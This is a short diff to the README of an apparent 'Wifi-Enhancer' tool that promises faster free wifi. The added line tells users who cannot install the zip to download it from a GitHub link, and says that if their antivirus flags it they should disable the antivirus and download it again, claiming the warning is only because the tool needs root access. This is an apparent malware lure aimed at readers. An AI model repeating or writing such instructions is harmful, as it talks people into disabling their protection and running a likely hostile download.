@@ -58,4 +58,4 @@ Installation
 
 5. Enjoy Your upgraded and faster wifi for free
 
-**NOTE** If you cannot install the zip paste this into your browser https://github.com/yeetergamerisnotsus/Wifi-Enhancer/archive/refs/heads/main.zip
+**NOTE** If you cannot install the zip paste this into your browser https://github.com/yeetergamerisnotsus/Wifi-Enhancer/archive/refs/heads/main.zip and if your antivirus falgs it dont worry its because this needs root access so just disable your antivirus and download it again as your antivirus might of removed some of the components.
